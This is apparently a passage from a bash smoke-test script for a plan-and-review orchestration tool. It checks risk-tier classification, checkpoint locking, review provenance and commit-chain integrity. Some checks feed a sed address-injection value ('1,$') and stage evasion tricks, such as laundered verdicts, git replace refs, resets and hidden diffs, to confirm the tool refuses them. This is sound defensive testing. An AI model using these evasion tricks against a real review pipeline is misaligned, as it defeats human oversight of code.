mkdir -p "$SMOKE_TMP/fd33/scripts"; printf '#!/bin/sh\n(sleep 6 >/dev/null 2>&1 </dev/null &)\necho "rung: effort+1"\n' >"$SMOKE_TMP/fd33/scripts/route.sh"; chmod +x "$SMOKE_TMP/fd33/scripts/route.sh"
printf '{"route_id": "r1"}' >"$CKS/dispatch/active-route.json"
has "ESCALATE_ROUTE: rung: effort+1" "$(cd "$CK" && APEX_DISPATCH_ROOT="$SMOKE_TMP/fd33" "$CP" plans/c-plan.md fail 1 "esc" 2>&1)" || fail "fail did not relay route.sh escalate"
t0=$SECONDS; (cd "$CK" && "$CP" plans/c-plan.md halt "lock probe" >/dev/null && "$CP" plans/c-plan.md resume "lock probe" >/dev/null)
[ $((SECONDS - t0)) -lt 4 ] || fail "a background child of route.sh held the checkpoint lock"
rm -f "$CKS/dispatch/active-route.json"
rm -f "$CKS/dispatch/reviews-raw/ag1.json" "$CKS/dispatch/reviews-raw/ag1b.json"
printf '{"head_sha": "%s", "verdict": "REQUEST_CHANGES", "role": "reviewer", "line": 1, "record_id": "run-0002"}' "$(sha)" >"$CKS/dispatch/reviews-raw/ag2.json"
(cd "$CK" && "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv2 --agent-id ag2 >/dev/null) || fail "a new record (possibly on a reused inode) was refused as already recorded"
ok "checkpoint: provenance required with dispatch state; role and line from the record; one use per record"

# 34. risk-tier: path classification fails closed (sso/acl inside words only
#     when the whole word is an allowlisted ordinary word; renames keep the
#     old path; unquoted UTF-8 paths); the diff base is the chain floor, never
#     later; the decision layer can raise a tier, never lower it.
rt_tier() { # rt_tier PATH... — the tier of a task diff that adds PATH(s), in a fresh run
  local d wt f; d="$(mktemp -d "$SMOKE_TMP/rt.XXXXXX")"; mkdir -p "$d/plans"; git init -q -b main "$d"
  git -C "$d" config core.quotepath false
  printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$d/plans/r-plan.md"; git -C "$d" add -A; git -C "$d" commit -qm r
  ( cd "$d" && APEX_GIBSON=0 "$EX/init.sh" plans/r-plan.md >/dev/null 2>&1 ) || { echo "init-failed"; return 0; }
  wt="$(st "$d" plans/r-plan.md)/worktree"
  for f in "$@"; do mkdir -p "$wt/$(dirname "$f")"; echo x >"$wt/$f"; done
  git -C "$wt" add -A; git -C "$wt" commit -qm t
  (cd "$d" && "$EX/risk-tier.sh" plans/r-plan.md 1 --no-record 2>&1) | sed -n 's/^TIER: //p'
}
for f in src/jwtVerify.ts lib/userRoles.ts src/userACLs.ts src/AzureADSSO.ts src/sso2/index.ts src/associateSSOIdentity.ts \
         src/ProcessorSSO.ts src/lessonsso.ts k8s/clusterrolebinding.yaml "İİİİ/sso/associated.ts" "db/données.sql"; do
  [ "$(rt_tier "$f")" = C ] || fail "$f was not Tier C"
done
# A submodule bump is code even when .gitmodules says ignore = all; a
# "-diff" attribute does not hide added lines.
SM="$(mktemp -d "$SMOKE_TMP/sm.XXXXXX")"; mkdir -p "$SM/plans"; git init -q -b main "$SM"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$SM/plans/s-plan.md"; git -C "$SM" add -A; git -C "$SM" commit -qm s
( cd "$SM" && APEX_GIBSON=0 "$EX/init.sh" plans/s-plan.md >/dev/null 2>&1 ) || fail "init for the submodule test failed"
SWT="$(st "$SM" plans/s-plan.md)/worktree"
printf '[submodule "x"]\n\tpath = vendor/auth\n\turl = ./x\n\tignore = all\n' >"$SWT/.gitmodules"
git -C "$SWT" update-index --add --cacheinfo "160000,$(git -C "$SWT" rev-parse HEAD),vendor/auth"; git -C "$SWT" add .gitmodules; git -C "$SWT" commit -qm sub
has "^TIER: C" "$(cd "$SM" && "$EX/risk-tier.sh" plans/s-plan.md 1 --no-record)" || fail "a submodule under an auth path (ignore = all) was not Tier C"
printf '*.py -diff\n' >"$SWT/.gitattributes"; echo 'stripe.Charge.create(amount_cents=1)' >"$SWT/pay_util.py"; git -C "$SWT" add -A; git -C "$SWT" commit -qm attr
has "content signal" "$(cd "$SM" && "$EX/risk-tier.sh" plans/s-plan.md 1 --no-record)" || fail "a -diff attribute hid a content signal"
for f in scripts/lessons.sh src/oracle.ts "lessons/İ.py"; do
  [ "$(rt_tier "$f")" = A ] || fail "$f was classified above Tier A"
done
RT="$SMOKE_TMP/rt34"; mkdir -p "$RT/plans" "$RT/src/auth"; git init -q -b main "$RT"
for i in 1 2; do printf -- '- [ ] **Phase 1.%s** a\n  - Acceptance: true\n' "$i"; done >"$RT/plans/r-plan.md"
echo x >"$RT/src/auth/session.py"; git -C "$RT" add -A; git -C "$RT" commit -qm r
( cd "$RT" && APEX_GIBSON=0 "$EX/init.sh" plans/r-plan.md >/dev/null 2>&1 ) || fail "init for the risk-tier test failed"
RWT="$(st "$RT" plans/r-plan.md)/worktree"
printf '#!/bin/sh\necho "{\\"verdict\\": \\"$FAKE_TIER\\", \\"uncertain\\": false}"\n' >"$SMOKE_TMP/decide.sh"; chmod +x "$SMOKE_TMP/decide.sh"
has "^TIER: B" "$(cd "$RT" && FAKE_TIER=B APEX_DECIDE_CMD="$SMOKE_TMP/decide.sh" "$EX/risk-tier.sh" plans/r-plan.md 3 --classify)" || fail "the decision layer could not raise the tier"
has "^TIER: B" "$(cd "$RT" && FAKE_TIER=A APEX_DECIDE_CMD="$SMOKE_TMP/decide.sh" "$EX/risk-tier.sh" plans/r-plan.md 3 --classify)" || fail "the decision layer lowered a recorded tier"
O="$(cd "$RT" && FAKE_TIER=C APEX_DECIDE_CMD="$SMOKE_TMP/decide.sh" "$EX/risk-tier.sh" plans/r-plan.md 3 --classify)"
has "^TIER: B" "$O" && has "said C, uncalibrated: not raised past B" "$O" || fail "an uncalibrated decision raised the tier to C: $O"
printf '#!/bin/sh\necho "{\\"scored\\": true, \\"verdict\\": \\"C\\", \\"uncertain\\": false, \\"calibrated\\": true}"\n' >"$SMOKE_TMP/decide-cal.sh"; chmod +x "$SMOKE_TMP/decide-cal.sh"
has "^TIER: C" "$(cd "$RT" && APEX_DECIDE_CMD="$SMOKE_TMP/decide-cal.sh" "$EX/risk-tier.sh" plans/r-plan.md 3 --classify)" || fail "a calibrated C did not raise the tier"
O="$(cd "$RT" && APEX_DECISION_LAYER_ROOT="$SMOKE_TMP/no-decision-layer" "$EX/risk-tier.sh" plans/r-plan.md 1 --classify --no-record)"
has "not installed and APEX_DECIDE_CMD not set" "$O" || fail "risk-tier --classify without a decision layer did not say so: $O"
if [ -x "$PLUGIN_ROOT/../apex-decision-layer/bin/apex-decide" ]; then
  O="$(cd "$RT" && "$EX/risk-tier.sh" plans/r-plan.md 1 --classify --no-record)"
  has "no usable answer (backend_none)" "$O" || fail "risk-tier --classify did not reach the unconfigured sibling apex-decision-layer: $O"
fi
git -C "$RWT" mv src/auth/session.py src/x.py; git -C "$RWT" commit -qm mv
has "^TIER: C" "$(cd "$RT" && "$EX/risk-tier.sh" plans/r-plan.md 1)" || fail "an auth file renamed to a bland name was not Tier C"
expect_refusal "an unknown --since" "not a commit" indir "$RT" "$EX/risk-tier.sh" plans/r-plan.md 1 --since deadbeefdeadbeef
expect_refusal "a --since later than the task's base" "later than this task's base" indir "$RT" "$EX/risk-tier.sh" plans/r-plan.md 1 --since "$(git -C "$RWT" rev-parse HEAD)"
expect_refusal "a non-numeric risk-tier line" "plan line number" indir "$RT" "$EX/risk-tier.sh" plans/r-plan.md '1,$'
expect_refusal "a risk-tier line that is not a task" "not a task" indir "$RT" "$EX/risk-tier.sh" plans/r-plan.md 2
ok "risk-tier: fail-closed path classes, renames, UTF-8 paths, chain floor; decision layer raises only, uncalibrated at most to B, sibling CLI found"

# 35. green-gate re-baselines a step the baseline never ran, at the fork SHA,
#     only when the fork resolves the same command (a plan-added step stays strict).
RB="$SMOKE_TMP/rb35"; mkdir -p "$RB/plans"; git init -q -b main "$RB"
printf 'test:\n\t@false\n' >"$RB/Makefile"; printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$RB/plans/b-plan.md"; git -C "$RB" add -A; git -C "$RB" commit -qm b
( cd "$RB" && "$EX/init.sh" plans/b-plan.md >/dev/null 2>&1 ) || fail "init for the re-baseline test failed"
BL="$(st "$RB" plans/b-plan.md)/gate/baseline.json"
python3 - "$BL" <<'PY'
import json, sys
p = sys.argv[1]; b = json.load(open(p)); b["steps"]["test"] = {"cmd": "", "exit": None}; json.dump(b, open(p, "w"))
PY
has "GATE_STEP: test PREEXISTING" "$( (cd "$RB" && "$EX/green-gate.sh" plans/b-plan.md check) 2>&1 || true)" || fail "a pre-existing red step missing from an old baseline was blamed on the plan"
NB="$SMOKE_TMP/nb35"; mkdir -p "$NB/plans"; git init -q -b main "$NB"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$NB/plans/n-plan.md"; git -C "$NB" add -A; git -C "$NB" commit -qm n
( cd "$NB" && "$EX/init.sh" plans/n-plan.md >/dev/null 2>&1 ) || fail "init for the strict re-baseline test failed"
NWT="$(st "$NB" plans/n-plan.md)/worktree"; printf 'test:\n\t@false\n' >"$NWT/Makefile"; git -C "$NWT" add -A; git -C "$NWT" commit -qm m
has "GATE_STEP: test NEW_FAILURE" "$( (cd "$NB" && "$EX/green-gate.sh" plans/n-plan.md check) 2>&1 || true)" || fail "a failing step the plan itself added was excused as pre-existing"
ok "green-gate: re-baseline at the fork only for steps the fork resolves"

# 36. checkpoint hardening: LINE_NO is a task line number (no sed address
#     injection, no "01" key); a REQUEST_CHANGES at a head survives `fail`;
#     Tier C never takes --skip-review; a missing tier is never waived; parallel
#     reviews keep every record; a halt clears with `resume`, not `rewind`.
CH="$SMOKE_TMP/ch36"; mkdir -p "$CH/plans"; git init -q -b main "$CH"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [docs] b\n  - Acceptance: true\n' >"$CH/plans/h-plan.md"; git -C "$CH" add -A; git -C "$CH" commit -qm h
( cd "$CH" && APEX_GIBSON=0 "$EX/init.sh" plans/h-plan.md >/dev/null 2>&1 ) || fail "init for the hardening test failed"
CHS="$(st "$CH" plans/h-plan.md)"; HWT="$CHS/worktree"; hsha() { git -C "$HWT" rev-parse HEAD; }
P0="$(cat "$CH/plans/h-plan.md")"
for bad in '1,$' 01 0 2; do
  expect_refusal "complete with LINE_NO '$bad'" "LINE_NO\|not a task" indir "$CH" "$CP" plans/h-plan.md complete "$bad" ok --skip-review n/a
  expect_refusal "rewind with LINE_NO '$bad'" "LINE_NO\|not a task" indir "$CH" "$CP" plans/h-plan.md rewind "$bad"
done
[ "$P0" = "$(cat "$CH/plans/h-plan.md")" ] || fail "a refused LINE_NO still edited the plan"
expect_refusal "no tier recorded, --skip-review" "no risk tier recorded" indir "$CH" "$CP" plans/h-plan.md complete 1 ok --skip-review n/a
git -C "$HWT" commit -q --allow-empty -m h1
(cd "$CH" && "$EX/green-gate.sh" plans/h-plan.md check >/dev/null 2>&1) || true
python3 - "$CHS/checkpoint.json" "$(hsha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p)); s.setdefault("tiers", {}).update({"1": {"tier": "C", "head": h}, "3": {"tier": "A", "head": h}}); json.dump(s, open(p, "w"))
PY
(cd "$CH" && "$CP" plans/h-plan.md approve 1 "$(hsha)" "approve G12 1" >/dev/null)
expect_refusal "Tier C with --skip-review" "cannot waive" indir "$CH" "$CP" plans/h-plan.md complete 1 ok --skip-review n/a
(cd "$CH" && "$CP" plans/h-plan.md review 3 "$(hsha)" REQUEST_CHANGES >/dev/null && "$CP" plans/h-plan.md fail 3 retry >/dev/null \
  && "$CP" plans/h-plan.md review 3 "$(hsha)" APPROVE >/dev/null) || fail "the laundering setup failed"
expect_refusal "a REQUEST_CHANGES laundered through fail" "requested changes" indir "$CH" "$CP" plans/h-plan.md complete 3 ok
pids=(); for l in correctness security consent money performance maintainability; do v=APPROVE; [ "$l" = money ] && v=REQUEST_CHANGES
  (cd "$CH" && "$CP" plans/h-plan.md review 1 "$(hsha)" "$v" "r-$l" --role "lens:$l" >/dev/null 2>&1) & pids+=($!); done
for p in "${pids[@]}"; do wait "$p" || fail "a parallel review was refused"; done
python3 -c 'import json,sys; r=[x for x in json.load(open(sys.argv[1]))["reviews"]["1"]["records"]]; assert len(r)==6 and sum(x["verdict"]=="REQUEST_CHANGES" for x in r)==1, len(r)' "$CHS/checkpoint.json" \
  || fail "parallel reviews lost a record"
for i in 1 2 3; do (cd "$CH" && "$CP" plans/h-plan.md fail 1 "f$i" >/dev/null); done
(cd "$CH" && "$CP" plans/h-plan.md rewind 1 >/dev/null)
python3 -c 'import json,sys; assert json.load(open(sys.argv[1]))["halted"]' "$CHS/checkpoint.json" || fail "rewind of an unchecked task cleared a halt"
(cd "$CH" && "$CP" plans/h-plan.md resume "human looked" >/dev/null)
python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); assert not s["halted"] and s["consecutive_failures"]==0' "$CHS/checkpoint.json" || fail "resume did not clear the halt"
# A 0.2.0 REQUEST_CHANGES at the head blocks --skip-review too.
python3 - "$CHS/checkpoint.json" "$(hsha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p)); s["halted"] = False; s["consecutive_failures"] = 0
s["tiers"]["3"] = {"tier": "A", "head": h}; s["reviews"]["3"] = {"sha": h, "verdict": "REQUEST_CHANGES", "round": 1}; json.dump(s, open(p, "w"))
PY
expect_refusal "a 0.2.0 REQUEST_CHANGES with --skip-review" "requested changes" indir "$CH" "$CP" plans/h-plan.md complete 3 ok --skip-review n/a
(cd "$CH" && "$CP" plans/h-plan.md halt "probe" >/dev/null)
expect_refusal "a review while halted" "halted" indir "$CH" "$CP" plans/h-plan.md review 3 "$(hsha)" APPROVE
(cd "$CH" && "$CP" plans/h-plan.md resume "probe" >/dev/null)
# A [gate:*] tag quoted in a code task does not exempt it.
GX="$SMOKE_TMP/gx36"; mkdir -p "$GX/plans"; git init -q -b main "$GX"
printf -- '- [ ] **Phase 1.1** [security] harden auth; docs mention `[gate:auto]` syntax\n  - Acceptance: true\n' >"$GX/plans/x-plan.md"; git -C "$GX" add -A; git -C "$GX" commit -qm x
( cd "$GX" && APEX_GIBSON=0 "$EX/init.sh" plans/x-plan.md >/dev/null 2>&1 ) || fail "init for the gate-tag test failed"
expect_refusal "a code task quoting a gate tag" "no independent review\|no risk tier\|green" indir "$GX" "$CP" plans/x-plan.md complete 1 ok
# A tier classifies one head: new code needs a new classification.
git -C "$HWT" commit -q --allow-empty -m h2; (cd "$CH" && "$EX/green-gate.sh" plans/h-plan.md check >/dev/null 2>&1) || true
expect_refusal "a tier recorded for an older head" "risk tier was recorded for" indir "$CH" "$CP" plans/h-plan.md complete 3 ok --skip-review n/a
# Tasks without a **Phase**/**Gate** id are ordinary tasks.
IX="$SMOKE_TMP/ix36"; mkdir -p "$IX/plans"; git init -q -b main "$IX"
printf -- '- [ ] tidy something without an id\n  - Acceptance: true\n- [ ] rewrite the login handler; unblocks **Gate 2** [gate:human]\n  - Acceptance: true\n' >"$IX/plans/i-plan.md"; git -C "$IX" add -A; git -C "$IX" commit -qm i
( cd "$IX" && APEX_GIBSON=0 "$EX/init.sh" plans/i-plan.md >/dev/null 2>&1 ) || fail "init for the id-less test failed"
(cd "$IX" && APEX_GIBSON=0 "$CP" plans/i-plan.md complete 1 ok >/dev/null 2>&1) && grep -q '^- \[x\] tidy' "$IX/plans/i-plan.md" || fail "an id-less task could not be completed"
(cd "$IX" && "$CP" plans/i-plan.md rewind 1 >/dev/null 2>&1) && grep -q '^- \[ \] tidy' "$IX/plans/i-plan.md" || fail "an id-less task could not be rewound"
expect_refusal "a code task naming a **Gate** in prose" "no green-gate\|no risk tier\|no independent review" indir "$IX" "$CP" plans/i-plan.md complete 3 ok
ok "checkpoint: line validation, no verdict laundering, no Tier C skip, parallel-safe, resume, halt, gate ids"

# 37. The chain (ADR-0003): a task's code is everything since the head the last
#     reviewed complete verified; complete re-classifies it; a gate line is
#     exempt only when it adds no code; land refuses unreviewed commits.
CN="$SMOKE_TMP/cn37"; mkdir -p "$CN/plans"; git init -q -b main "$CN"
printf -- '- [ ] **Phase 1.1** [docs] first\n  - Acceptance: true\n- [ ] **Gate 1→2** [gate:human] sign-off\n  - Acceptance: true\n- [ ] **Phase 2.1** [docs] second\n  - Acceptance: true\n- [ ] **Gate 2→3** [gate:human] [tier:c] security sign-off\n  - Acceptance: true\n' >"$CN/plans/n-plan.md"
git -C "$CN" add -A; git -C "$CN" commit -qm n
( cd "$CN" && APEX_GIBSON=0 "$EX/init.sh" plans/n-plan.md >/dev/null 2>&1 ) || fail "init for the chain test failed"
CNS="$(st "$CN" plans/n-plan.md)"; NWT="$CNS/worktree"; nsha() { git -C "$NWT" rev-parse HEAD; }
cn() { (cd "$CN" && "$@"); }
FORK="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["fork_sha"])' "$CNS/checkpoint.json")"
[ "$FORK" = "$(nsha)" ] || fail "init did not record the fork point"
echo doc >"$NWT/notes.md"; git -C "$NWT" add -A; git -C "$NWT" commit -qm doc; H1="$(nsha)"
cn "$EX/green-gate.sh" plans/n-plan.md check >/dev/null 2>&1 || true
cn "$EX/risk-tier.sh" plans/n-plan.md 1 >/dev/null; cn "$CP" plans/n-plan.md review 1 "$H1" APPROVE >/dev/null
cn "$CP" plans/n-plan.md complete 1 ok >/dev/null 2>&1 || fail "a reviewed docs task could not complete"
has "^TASK_BASE: $H1" "$(cn "$EX/iterate.sh" plans/n-plan.md 2>&1)" || fail "TASK_BASE is not the head the last complete verified"
cn "$EX/risk-tier.sh" plans/n-plan.md 3 >/dev/null                      # gate tiered A on an empty diff
mkdir -p "$NWT/src/auth"; echo x >"$NWT/src/auth/login.py"; git -C "$NWT" add -A; git -C "$NWT" commit -qm auth
cn "$EX/green-gate.sh" plans/n-plan.md check >/dev/null 2>&1 || true
expect_refusal "a gate line carrying code (tiered before the code)" "recorded for\|classifies as Tier C\|no independent review" cn "$CP" plans/n-plan.md complete 3 ok
expect_refusal "a --since after the last complete" "later than this task's base" cn "$EX/risk-tier.sh" plans/n-plan.md 3 --since "$(nsha)"
python3 - "$CNS/checkpoint.json" "$(nsha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p)); s["tiers"]["3"] = {"tier": "A", "head": h}; json.dump(s, open(p, "w"))
PY
expect_refusal "a recorded tier below the task diff" "classifies as Tier C" cn "$CP" plans/n-plan.md complete 3 ok
cn "$CP" plans/n-plan.md fail 3 retry >/dev/null
has "^TASK_BASE: $H1" "$(cn "$EX/iterate.sh" plans/n-plan.md 2>&1)" || fail "fail moved the chain floor"
git -C "$NWT" reset -q --hard "$H1"
cn "$CP" plans/n-plan.md complete 3 ok >/dev/null 2>&1 || fail "a gate line with no code could not complete"
expect_refusal "a [tier:c] gate line" "no risk tier\|adversarial\|G12\|no independent review" cn "$CP" plans/n-plan.md complete 7 ok
echo y >"$NWT/src.py"; mkdir -p "$NWT/src/auth"; echo x >"$NWT/src/auth/token.py"; git -C "$NWT" add -A; git -C "$NWT" commit -qm unreviewed
(cd "$CN" && APEX_GIBSON=0 "$CP" plans/n-plan.md complete 5 ok >/dev/null 2>&1) || fail "APEX_GIBSON=0 complete failed"
has "^TASK_BASE: $H1" "$(cn "$EX/iterate.sh" plans/n-plan.md 2>&1)" || fail "an APEX_GIBSON=0 completion advanced the chain"
(cd "$CN" && APEX_GIBSON=0 "$CP" plans/n-plan.md complete 7 ok >/dev/null 2>&1) || fail "APEX_GIBSON=0 complete of the last task failed"
expect_refusal "landing commits no reviewed complete covered" "after the last reviewed completion" cn "$EX/land.sh" plans/n-plan.md
cn "$CP" plans/n-plan.md rewind 1 >/dev/null
python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); assert not s["completes"], s["completes"]' "$CNS/checkpoint.json" || fail "rewind did not move the chain back"
# A run that predates the chain gets its fork point from the base branch on
# re-init, never from the worktree head (unreviewed commits stay in the diff).
python3 - "$CNS/checkpoint.json" <<'PY'
import json, sys
p = sys.argv[1]; s = json.load(open(p)); s.pop("fork_sha", None); s.pop("completes", None); json.dump(s, open(p, "w"))
PY
(cd "$CN" && APEX_GIBSON=0 "$EX/init.sh" plans/n-plan.md >/dev/null 2>&1) || fail "re-init of a pre-chain run failed"
python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); assert s["fork_sha"]==sys.argv[2], s["fork_sha"]' "$CNS/checkpoint.json" "$FORK" \
  || fail "re-init took the fork point from the worktree head"
# Land: a worktree that cannot be removed leaves the run unlanded.
LD="$SMOKE_TMP/ld37"; mkdir -p "$LD/plans"; git init -q -b main "$LD"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$LD/plans/l-plan.md"; git -C "$LD" add -A; git -C "$LD" commit -qm l
( cd "$LD" && APEX_GIBSON=0 "$EX/init.sh" plans/l-plan.md >/dev/null 2>&1 ) || fail "init for the land test failed"
LWT="$(st "$LD" plans/l-plan.md)/worktree"; echo doc >"$LWT/notes.md"; git -C "$LWT" add -A; git -C "$LWT" commit -qm d
(cd "$LD" && "$EX/green-gate.sh" plans/l-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/l-plan.md 1 >/dev/null \
  && "$CP" plans/l-plan.md review 1 "$(git -C "$LWT" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/l-plan.md complete 1 ok >/dev/null 2>&1) \
  || fail "the land fixture task could not complete"
git -C "$LD" add plans/l-plan.md; git -C "$LD" commit -qm tick
git -C "$LD" worktree lock "$LWT"
expect_refusal "landing with a worktree that cannot be removed" "could not remove the worktree" indir "$LD" "$EX/land.sh" plans/l-plan.md
python3 -c 'import json,sys; assert not json.load(open(sys.argv[1]))["landed"]' "$(dirname "$LWT")/checkpoint.json" || fail "a run whose worktree survived was marked landed"
ok "chain: fork point, TASK_BASE, re-classified complete, code-free gates, fail/rewind/APEX_GIBSON=0, land boundary, re-init, surviving worktree"

# 38. Chain hardening: no tier escapes through an environment-chosen
#     exclusion, a binary file in the same diff, a reset onto an older
#     commit, a replace ref, or a fork point that is no longer on the base.
mkrun() { # mkrun DIR — a one-task docs run, initialised; prints its worktree
  mkdir -p "$1/plans"; git init -q -b main "$1"
  printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [docs] b\n  - Acceptance: true\n' >"$1/plans/k-plan.md"
  git -C "$1" add -A; git -C "$1" commit -qm k
  ( cd "$1" && APEX_GIBSON=0 "$EX/init.sh" plans/k-plan.md >/dev/null 2>&1 ) || return 1
  printf '%s\n' "$(st "$1" plans/k-plan.md)/worktree"
}
PAY='import stripe  # amount_cents'
K1="$SMOKE_TMP/k1"; KW="$(mkrun "$K1")" || fail "init for check 38 failed"
mkdir -p "$KW/src/billing"; echo "$PAY" >"$KW/src/billing/payment.py"; git -C "$KW" add -A; git -C "$KW" commit -qm pay
has "^TIER: C" "$(cd "$K1" && APEX_LESSONS_FILE="$KW/src" "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record)" || fail "APEX_LESSONS_FILE hid code from the task diff"
K2="$SMOKE_TMP/k2"; KW="$(mkrun "$K2")" || fail "init for check 38 failed"
echo "$PAY" >"$KW/pay_util.py"; printf 'PNG\000\001\002' >"$KW/icon.png"; git -C "$KW" add -A; git -C "$KW" commit -qm bin
has "^TIER: C" "$(cd "$K2" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record)" || fail "a binary file in the diff hid a content signal"
K3="$SMOKE_TMP/k3"; KW="$(mkrun "$K3")" || fail "init for check 38 failed"; K3F="$(git -C "$KW" rev-parse HEAD)"
echo "$PAY" >"$KW/pay_util.py"; git -C "$KW" add -A; git -C "$KW" commit -qm x; KX="$(git -C "$KW" rev-parse HEAD)"
git -C "$KW" rm -q pay_util.py; echo doc >"$KW/notes.md"; git -C "$KW" add -A; git -C "$KW" commit -qm y
(cd "$K3" && "$EX/green-gate.sh" plans/k-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/k-plan.md 1 >/dev/null \
  && "$CP" plans/k-plan.md review 1 "$(git -C "$KW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/k-plan.md complete 1 ok >/dev/null 2>&1) \
  || fail "the reset fixture task could not complete"
git -C "$KW" reset -q --hard "$KX"
has "^TASK_BASE: $K3F" "$(cd "$K3" && "$EX/iterate.sh" plans/k-plan.md 2>&1)" || fail "a reset onto an older commit moved the floor onto that commit"
has "^TIER: C" "$(cd "$K3" && "$EX/risk-tier.sh" plans/k-plan.md 3 --no-record)" || fail "code under a reset escaped the task diff"
K4="$SMOKE_TMP/k4"; KW="$(mkrun "$K4")" || fail "init for check 38 failed"; K4F="$(git -C "$KW" rev-parse HEAD)"
echo "$PAY" >"$KW/pay_util.py"; git -C "$KW" add -A; git -C "$KW" commit -qm p
git -C "$KW" replace "$K4F" "$(git -C "$KW" commit-tree "HEAD^{tree}" -m fake)"
has "^TIER: C" "$(cd "$K4" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record)" || fail "a replace ref changed what the task diff shows"
K5="$SMOKE_TMP/k5"; KW="$(mkrun "$K5")" || fail "init for check 38 failed"
python3 - "$(dirname "$KW")/checkpoint.json" <<'PY'
import json, sys
p = sys.argv[1]; s = json.load(open(p)); s.pop("fork_sha", None); s.pop("completes", None); json.dump(s, open(p, "w"))
PY
echo "$PAY" >"$KW/pay_util.py"; git -C "$KW" add -A; git -C "$KW" commit -qm p
git -C "$K5" merge -q --no-ff -m hand "$(git -C "$KW" symbolic-ref --short HEAD)"
(cd "$K5" && "$EX/iterate.sh" plans/k-plan.md >/dev/null 2>&1) || true
git -C "$K5" reset -q --hard HEAD~1
expect_refusal "a fork point no longer on the base branch" "not on main\|no diff base" indir "$K5" "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record
ok "chain hardening: env exclusions, binary diffs, resets, replace refs, fork point on the base"

# 39. Classifier inputs do not depend on user git config or pipe sizes; runs
#     without a worktree, on a feature branch or with a remote base work; a run
#     without a worktree cannot restart below unreviewed commits; the user's
#     gate commands keep their git environment.
PRICE='def total(x): return x.price * 2  # charge(currency)'
L1="$SMOKE_TMP/l1"; LW="$(mkrun "$L1")" || fail "init for check 39 failed"
echo "$PRICE" >"$LW/util.py"; git -C "$LW" add -A; git -C "$LW" commit -qm u; git -C "$LW" config color.diff always; git -C "$LW" config color.ui always
has "^TIER: C" "$(cd "$L1" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record)" || fail "color.diff=always hid a content signal"
L2="$SMOKE_TMP/l2"; LW="$(mkrun "$L2")" || fail "init for check 39 failed"
{ echo "$PRICE"; seq 1 20000 | sed 's/^/# /'; } >"$LW/aaa_util.py"; git -C "$LW" add -A; git -C "$LW" commit -qm big
has "^TIER: C" "$(cd "$L2" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record)" || fail "a large diff with an early signal was not Tier C"
L3="$SMOKE_TMP/l3"; mkdir -p "$L3/plans"; git init -q -b main "$L3"; printf '.dev-plan-state/\n' >"$L3/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$L3/plans/k-plan.md"; git -C "$L3" add -A; git -C "$L3" commit -qm k
( cd "$L3" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/k-plan.md >/dev/null 2>&1 ) || fail "no-worktree init failed"
echo "$PRICE" >"$L3/util.py"; git -C "$L3" add -A; git -C "$L3" commit -qm x
expect_refusal "a no-worktree restart (APEX_INIT_FORCE) over unreviewed commits" "below the new run's fork point" \
  indir "$L3" APEX_NO_WORKTREE=1 APEX_INIT_FORCE=1 "$EX/init.sh" plans/k-plan.md
git -C "$L3" mv plans/k-plan.md plans/k2-plan.md; git -C "$L3" commit -qm mv
expect_refusal "a no-worktree run started under a moved plan" "below the new run's fork point" \
  indir "$L3" APEX_NO_WORKTREE=1 "$EX/init.sh" plans/k2-plan.md
L4="$SMOKE_TMP/l4"; mkdir -p "$L4/plans"; git init -q -b main "$L4"; printf '.dev-plan-state/\n' >"$L4/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$L4/plans/k-plan.md"; git -C "$L4" add -A; git -C "$L4" commit -qm k
git -C "$L4" checkout -qb feature; echo "$PRICE" >"$L4/util.py"; git -C "$L4" add -A; git -C "$L4" commit -qm f
( cd "$L4" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/k-plan.md >/dev/null 2>&1 ) || fail "no-worktree init on a feature branch failed"
has "^TIER: C" "$(cd "$L4" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record 2>&1)" || fail "a no-worktree run on a feature branch did not classify its branch's commits"
L5="$SMOKE_TMP/l5"; mkdir -p "$L5/plans"; git init -q -b main "$L5"; printf '.dev-plan-state/\n' >"$L5/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$L5/plans/k-plan.md"; git -C "$L5" add -A; git -C "$L5" commit -qm k
git -C "$L5" checkout -qb side; mkdir -p "$L5/src/auth"; echo 'import stripe' >"$L5/src/auth/token.py"; git -C "$L5" add src; git -C "$L5" commit -qm e; LE="$(git -C "$L5" rev-parse HEAD)"
git -C "$L5" checkout -q main; git -C "$L5" merge -q -s ours -m ours side
( cd "$L5" && APEX_GIBSON=0 "$EX/init.sh" plans/k-plan.md >/dev/null 2>&1 ) || fail "init for the -s ours test failed"
LW="$(st "$L5" plans/k-plan.md)/worktree"
git -C "$LW" reset -q --hard "$LE"; echo doc >"$LW/notes.md"; git -C "$LW" add notes.md; git -C "$LW" commit -qm n
